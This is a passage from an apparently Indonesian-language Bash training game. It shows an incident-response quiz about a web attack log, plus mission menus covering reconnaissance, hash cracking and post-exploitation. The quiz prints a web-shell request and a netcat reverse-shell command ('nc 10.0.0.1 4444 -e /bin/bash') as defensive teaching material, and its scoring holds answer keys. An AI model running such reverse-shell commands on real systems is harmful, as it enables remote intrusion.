    fi
    echo ""

    echo "  Pertanyaan 2: Serangan pertama yang dilakukan adalah?"
    echo "  a) Upload web shell"
    echo "  b) SQL Injection"
    echo "  c) Command Injection"
    echo "  d) Brute Force"
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        sukses "Benar. Dimulai dengan SQLi (09:45:11) untuk ekstrak data."
        ((skor++))
    else
        gagal "Jawaban: b) SQL Injection dimulai 09:45:11."
    fi
    echo ""

    echo "  Pertanyaan 3: Attacker berhasil upload file apa dan ke mana?"
    echo -ne "  Jawab: "
    read -r j
    if echo "${j,,}" | grep -qE "cmd.php|upload|shell|web.?shell"; then
        sukses "Benar. cmd.php (web shell) berhasil diupload ke /uploads/"
        ((skor++))
    else
        gagal "Jawaban: cmd.php (web shell) di-upload ke /uploads/ via /admin/upload.php"
    fi
    echo ""

    echo "  Pertanyaan 4: Baris terakhir log menunjukkan apa?"
    echo -e "  ${DIM}  GET /uploads/cmd.php?c=nc+10.0.0.1+4444+-e+/bin/bash${RESET}"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if echo "${j,,}" | grep -qE "reverse.?shell|nc|netcat|koneksi.*balik|connect.*back"; then
        sukses "Benar. Attacker membuat reverse shell via netcat ke 10.0.0.1:4444"
        ((skor++))
    else
        gagal "Attacker jalankan netcat reverse shell ke IP mereka: nc 10.0.0.1 4444 -e /bin/bash"
    fi
    echo ""

    echo "  Pertanyaan 5: IOC (Indicators of Compromise) apa yang bisa kamu ekstrak?"
    echo -ne "  Sebutkan minimal 2: "
    read -r j
    ioc_count=0
    echo "${j,,}" | grep -qE "203.0.113.42|ip.*203" && ((ioc_count++))
    echo "${j,,}" | grep -qE "cmd.php|web.?shell|uploads" && ((ioc_count++))
    echo "${j,,}" | grep -qE "10.0.0.1|4444|c2|command" && ((ioc_count++))
    if [ "$ioc_count" -ge 2 ]; then
        sukses "IOC yang baik. Minimal: IP attacker, file cmd.php, IP C2 10.0.0.1"
        ((skor++))
    else
        hint "IOC yang ada: IP 203.0.113.42, file /uploads/cmd.php, C2 server 10.0.0.1:4444"
    fi
    jeda

    clear
    header_misi "M-06" "Incident Response Simulation" "Defensive Security" "Sulit" "$RED"

    echo -e "${WHITE}  LANGKAH RESPONSE:${RESET}"
    echo ""

    echo "  Pertanyaan 6: Langkah PERTAMA yang harus dilakukan setelah insiden dikonfirmasi?"
    echo ""
    echo "  a) Langsung hapus semua log untuk bersih-bersih"
    echo "  b) Isolasi server dari jaringan (containment)"
    echo "  c) Publish ke media sosial tentang insiden ini"
    echo "  d) Tunggu sampai ada korban lagi"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        sukses "Benar. Containment dulu: isolasi server, blokir IP attacker, preserve evidence."
        ((skor++))
    else
        gagal "Jawaban: b) Containment - isolasi sistem untuk cegah kerusakan lebih lanjut."
    fi
    echo ""

    echo "  Pertanyaan 7: Apa yang JANGAN dilakukan dengan log setelah insiden?"
    echo ""
    echo "  a) Biarkan log apa adanya sebagai evidence"
    echo "  b) Backup log ke storage yang aman"
    echo "  c) Hapus log agar attacker tidak tahu kita deteksi"
    echo "  d) Copy log untuk forensic analysis"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "c" ]]; then
        sukses "Benar. Log adalah evidence. JANGAN dihapus. Preserve untuk forensic dan hukum."
        ((skor++))
    else
        gagal "Jawaban: c) JANGAN hapus log. Log adalah evidence forensik."
    fi

    echo ""
    persen=$(( skor * 100 / 7 ))
    echo -e "  Skor: ${WHITE}$skor / 7${RESET} ($persen%)"
    echo ""

    if [ "$skor" -ge 5 ]; then
        sukses "Misi M-06 berhasil! Kamu sudah bisa melakukan incident response dasar."
        selesaikan_misi "M-06" "Incident Response Simulation"
    elif [ "$skor" -ge 3 ]; then
        echo -e "  ${YELLOW}  Cukup baik. Pelajari lebih lanjut tentang DFIR (Digital Forensics & IR).${RESET}"
    else
        gagal "Perlu belajar lebih banyak. Pelajari modul Defensive Security."
    fi
    jeda
}


tampil_semua_misi() {
    clear
    echo -e "${CYAN}"
    echo "  ╔══════════════════════════════════════════════════════════════╗"
    echo "  ║                      $CT_MISSION_STATUS                       ║"
    echo "  ╚══════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    echo ""

    cek_status() {
        local id="$1"
        cek_misi_selesai "$id" && echo -e "${GREEN}[SELESAI]${RESET}" || echo -e "${DIM}[BELUM  ]${RESET}"
    }

    echo -e "${GREEN}  LEVEL MUDAH:${RESET}"
    printf "  %-6s %-45s %s\n" "M-01" "Investigasi Domain Target" "$(cek_status M-01)"
    printf "  %-6s %-45s %s\n" "M-02" "Port Scan & Service Fingerprinting" "$(cek_status M-02)"
    echo ""
    echo -e "${YELLOW}  LEVEL SEDANG:${RESET}"
    printf "  %-6s %-45s %s\n" "M-03" "Analisis Kriptografi & Hash Cracking" "$(cek_status M-03)"
    printf "  %-6s %-45s %s\n" "M-04" "Web Vulnerability Hunting" "$(cek_status M-04)"
    echo ""
    echo -e "${RED}  LEVEL SULIT:${RESET}"
    printf "  %-6s %-45s %s\n" "M-05" "Linux Post-Exploitation Walkthrough" "$(cek_status M-05)"
    printf "  %-6s %-45s %s\n" "M-06" "Incident Response Simulation" "$(cek_status M-06)"
    echo ""

    total_selesai=$(grep -c "." "$MISI_SAVE" 2>/dev/null || echo 0)
    echo -e "${CYAN}  ----------------------------------------------------------------${RESET}"
    echo -e "  Total $CT_DONE: ${WHITE}$total_selesai / 6${RESET}"

    if [ "$total_selesai" -ge 6 ]; then
        echo ""
        echo -e "  ${GREEN}  Semua misi selesai! Kamu adalah Security Analyst yang handal.${RESET}"
    fi
    echo ""
    jeda
}


misi_menu() {
    while true; do
        clear
        echo -e "${CYAN}"
        echo "  ╔══════════════════════════════════════════════════════════════╗"
        echo "  ║                    $CT_MISSION_MENU                    ║"
        echo "  ╠══════════════════════════════════════════════════════════════╣"
        echo "  ║  Selesaikan misi untuk membuktikan skill kamu.               ║"
        echo "  ║  Setiap misi mensimulasikan tugas pentester sungguhan.       ║"
        echo "  ╚══════════════════════════════════════════════════════════════╝"
        echo -e "${RESET}"
        echo ""
        echo -e "${GREEN}  -- LEVEL MUDAH --${RESET}"
        cek_misi_selesai "M-01" && t="${GREEN}[SELESAI]${RESET}" || t="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[1]${RESET} M-01 : Investigasi Domain Target             $t"
        cek_misi_selesai "M-02" && t="${GREEN}[SELESAI]${RESET}" || t="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[2]${RESET} M-02 : Port Scan & Service Fingerprinting    $t"
        echo ""
        echo -e "${GREEN}  -- LEVEL SEDANG --${RESET}"
        cek_misi_selesai "M-03" && t="${GREEN}[SELESAI]${RESET}" || t="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[3]${RESET} M-03 : Analisis Kriptografi & Hash Cracking  $t"
        cek_misi_selesai "M-04" && t="${GREEN}[SELESAI]${RESET}" || t="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[4]${RESET} M-04 : Web Vulnerability Hunting             $t"
        echo ""
        echo -e "${GREEN}  -- LEVEL SULIT --${RESET}"
        cek_misi_selesai "M-05" && t="${GREEN}[SELESAI]${RESET}" || t="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[5]${RESET} M-05 : Linux Post-Exploitation Walkthrough   $t"
        cek_misi_selesai "M-06" && t="${GREEN}[SELESAI]${RESET}" || t="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[6]${RESET} M-06 : Incident Response Simulation          $t"
        echo ""
        echo -e "  ${GREEN}[7] Status Semua Misi"
        echo -e "  ${YELLOW}[0]${RED} Kembali ke Menu Utama"
        echo ""
        echo -e "${CYAN}  ----------------------------------------------------------------${RESET}"
        echo -ne "  Pilih misi [0-7]: "
        read -r p
        case "$p" in
            1) misi_M01 ;;
            2) misi_M02 ;;
            3) misi_M03 ;;
            4) misi_M04 ;;
            5) misi_M05 ;;
            6) misi_M06 ;;
            7) tampil_semua_misi ;;
            0) break ;;
            *) echo -e "${RED}  Pilihan tidak valid.${RESET}"; sleep 1 ;;
        esac
    done
}

misi_menu
